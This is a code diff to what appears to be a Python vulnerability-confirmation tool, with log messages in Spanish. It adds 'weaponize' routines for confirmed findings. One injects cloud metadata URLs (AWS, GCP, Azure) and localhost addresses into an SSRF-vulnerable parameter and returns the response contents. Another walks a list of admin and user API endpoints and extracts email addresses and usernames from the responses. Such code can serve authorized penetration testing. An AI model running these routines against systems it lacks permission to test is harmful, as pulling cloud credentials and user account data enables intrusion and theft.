@@ -7976,6 +7976,84 @@ def _try_weaponize_generic(
                             "impact": f"SQLi confirmed — DB version extracted: {db_ver}",
                         }
 
+        # --- SSRF: probe cloud metadata / internal services ---
+        elif _vc in ("ssrf", "server-side-request-forgery", "request-forgery"):
+            _ssrf_param = None
+            _all_params = dict(query_params or {})
+            _all_params.update(post_data or {})
+            for k, v in _all_params.items():
+                if isinstance(v, str) and any(x in v.lower() for x in
+                                               ("ssrf_canary", "http://", "https://", "attacker")):
+                    _ssrf_param = k
+                    break
+            if _ssrf_param:
+                import re as _re
+                _ssrf_targets = [
+                    # AWS IMDSv1
+                    "http://169.254.169.254/latest/meta-data/",
+                    # GCP metadata
+                    "http://metadata.google.internal/computeMetadata/v1/instance/",
+                    # Azure IMDS
+                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                    # localhost services
+                    "http://127.0.0.1:80/",
+                    "http://127.0.0.1:8080/",
+                ]
+                step("weaponize/ssrf: probando endpoints cloud metadata y servicios internos...")
+                for ssrf_target in _ssrf_targets:
+                    p_override = {_ssrf_param: ssrf_target}
+                    if method.upper() == "GET":
+                        body_w = _send_weap(params_override=dict(_all_params, **p_override))
+                    else:
+                        body_w = _send_weap(data_override=dict(_all_params, **p_override))
+                    if any(x in body_w for x in ("ami-id", "instance-id", "meta-data",
+                                                   "computeMetadata", "subscriptionId")):
+                        step(f"weaponize/ssrf: metadata de nube extraida via {ssrf_target}")
+                        return {
+                            "technique": "ssrf_cloud_metadata",
+                            "data": {"target_url": ssrf_target,
+                                     "response_snippet": body_w[:200]},
+                            "impact": (f"SSRF confirmed — cloud metadata endpoint reachable "
+                                       f"({ssrf_target}): {body_w[:80]}"),
+                        }
+                    if body_w and len(body_w) > 20:
+                        step(f"weaponize/ssrf: respuesta interna recibida ({ssrf_target})")
+                        return {
+                            "technique": "ssrf_internal_service",
+                            "data": {"target_url": ssrf_target,
+                                     "response_snippet": body_w[:200]},
+                            "impact": (f"SSRF confirmed — internal service response received "
+                                       f"from {ssrf_target}"),
+                        }
+
+        # --- Auth bypass: try to access privileged endpoints ---
+        elif _vc in ("auth-bypass", "authentication-bypass", "broken-authentication",
+                     "missing-authorization", "broken-access-control", "idor"):
+            _all_params = dict(query_params or {})
+            _all_params.update(post_data or {})
+            import re as _re
+            _priv_endpoints = [
+                "/api/admin/users", "/api/admin/settings", "/api/admin/config",
+                "/api/v1/admin/users", "/api/v2/admin/users",
+                "/admin/api/users", "/admin/users",
+                "/api/users", "/api/settings",
+                endpoint,  # already confirmed endpoint
+            ]
+            step("weaponize/auth-bypass: intentando acceder a endpoints privilegiados...")
+            for ep_priv in _priv_endpoints:
+                body_w = _send_weap(new_ep=ep_priv)
+                if _re.search(r'"(email|username|user_id|id)"\s*:', body_w):
+                    step(f"weaponize/auth-bypass: datos de usuario extraidos via {ep_priv}")
+                    users_m = _re.findall(r'"(?:email|username)"\s*:\s*"([^"]{3,})"',
+                                          body_w)[:3]
+                    return {
+                        "technique": "auth_bypass_data_extraction",
+                        "data": {"endpoint": ep_priv, "users_found": users_m,
+                                 "response_snippet": body_w[:200]},
+                        "impact": (f"Auth bypass confirmed — user data accessible at {ep_priv}: "
+                                   f"found accounts {users_m!r}"),
+                    }
+
         # --- Path traversal / LFI: read /proc/version ---
         elif _vc in ("path-traversal", "lfi", "arbitrary-file-read",
                      "directory-traversal", "file-inclusion"):
@@ -8129,7 +8207,7 @@ def verify_generic_http_confirm(
             matched = next(p for p in patched_patterns if p.lower() in body.lower())
             res.detail = (f"respuesta contiene patron de parche {matched!r} -> "
                           f"este endpoint ya fue corregido")
-            res.evidence = body[:500]
+            res.evidence = {"respuesta_cuerpo_recorte": body[:500]}
             return res
 
         if confirm_string.lower() in _searchable.lower():
@@ -8219,7 +8297,7 @@ def verify_generic_http_confirm(
 
         res.detail = (f"confirm_string {confirm_string!r} NO encontrado en la respuesta "
                       f"de {m} {endpoint} (len={len(body)})")
-        res.evidence = body[:300]
+        res.evidence = {"respuesta_cuerpo_recorte": body[:300]}
         step(f"confirm_string {confirm_string!r} no encontrado — primeros 300 chars: {body[:300]!r}")
         return res
     except Exception as e:
